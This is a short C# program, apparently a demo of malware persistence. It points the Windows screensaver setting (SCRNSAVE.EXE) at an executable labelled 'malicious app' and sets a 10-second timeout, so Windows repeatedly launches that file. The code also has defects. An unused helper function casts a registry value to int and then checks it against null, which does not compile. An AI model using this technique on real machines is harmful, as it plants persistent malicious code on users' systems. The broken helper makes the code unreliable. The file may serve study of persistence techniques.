using Microsoft.Win32;

class Program
{
    static int RegKeyCompare(RegistryKey hKeyRoot, string lpSubKey, string regVal, string compare)
    {
        RegistryKey hKey = null;
        int ret;
        string value;
        ret = (int)hKeyRoot.OpenSubKey(lpSubKey).GetValue(regVal);
        if (ret != null)
        {
            value = ret.ToString();
            if (value == compare)
            {
                return 1;
            }
        }
        return 0;
    }

    static void Main(string[] args)
    {
        RegistryKey hkey = null;
        // malicious app
        const string exe = "C:\\Users\\user\\Desktop\\mal_ShowTextBox.exe";
        // timeout
        const string ts = "10";
        // activation
        const string aact = "1";

        // startup
        hkey = Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true);
        if (hkey != null)
        {
            // create new registry keys
            hkey.SetValue("ScreenSaveActive", aact);
            hkey.SetValue("ScreenSaveTimeOut", ts);
            hkey.SetValue("SCRNSAVE.EXE", exe);
            hkey.Close();
        }
    }
}